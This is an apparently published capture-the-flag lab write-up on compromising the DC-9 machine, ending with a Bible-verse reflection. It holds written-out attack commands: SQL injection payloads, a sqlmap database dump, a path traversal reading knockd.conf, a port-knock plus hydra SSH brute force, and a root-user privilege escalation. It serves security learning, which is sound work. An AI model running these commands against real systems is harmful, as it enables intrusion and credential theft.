...
**Target:** _DC-9 (192.168.247.209)_ **OS:** _Linux (Debian)_ **Difficulty:** _Intermediate_ **Attack Vectors:** _Web Enumeration -> SQL Injection (SQLi) -> Credential Harvesting -> Port Knocking -> Privilege Escalation_
...
* **SQL Injection (SQLi):** The search parameter on the “Staff Details” page is unsanitized, allowing for database enumeration and arbitrary data exfiltration.
* **Credential Disclosure:** Successful exploitation of the database confirmed the existence of multiple staff user accounts and passwords.
* **Service Filtering:** Port 22 (SSH) is filtered, indicating a defensive Port Knocking mechanism that must be bypassed.
...
* **Port 22 (SSH):** filtered (port-unreach)
...
* **Payload:** `' ORDER BY 6 -- -` (Page returned error )
* **Payload:** `' ORDER BY 7 -- -` (Page returned error)
...
* **User:** `admin`
* **Hash:** `8XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`
...
* **URL:** [`http://192.168.247.209/manage.php`](http://192.168.247.209/manage.php)
* **Username:** `admin`
...
* **Command:** `sqlmap -r Req.txt -D users -T UserDetails --dump --batch`
* **Findings:** The table contained 17 entries with cleartext passwords for various system users.
...
* **Command:** `http://192.168.247.209/manage.php?file=../../../../../../etc/knockd.conf"`
* **Findings:** The file revealed a secret sequence required to open the SSH service.
...
* **Command:** `knock 192.168.247.209 7469 8475 9842 && hydra -L users.txt -P passwords.txt 192.168.247.209 ssh -t 4`
...
* **User:** `janitor`
* **Password:** `Ixxxxxxxxx`
* **Command:** `ssh janitor@192.168.185.209`
...
* **Target User:** `fredf`
* **Password Identified:** `Bxxxxxxxx`
* **Significance:** The user `fredf` was identified as a sudoer with specific execution rights.
...
1. **Payload Generation:** A new user `root42` was hashed using OpenSSL.
...
* **User Flag (`local.txt`):** Recovered from `/home/fredf/local.txt`.
* **Root Flag (`theflag.txt`):** Recovered from `/root/theflag.txt`.
...
**The Connection:** In the DC-9 lab, the administrators believed they had secured the network by simply making the SSH port invisible. They thought the risk was mitigated because the door appeared to be gone. But as **Matthew 7:7** reminds us, the door _will_ be opened to those who know how to knock.
...
By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [February 10, 2026](https://medium.com/p/0755882e3fa0).

[Canonical link](https://medium.com/@nicholasmullenski/unearthing-the-truth-in-dc-9-from-sql-injection-to-ssh-hijacking-%EF%B8%8F-0755882e3fa0)
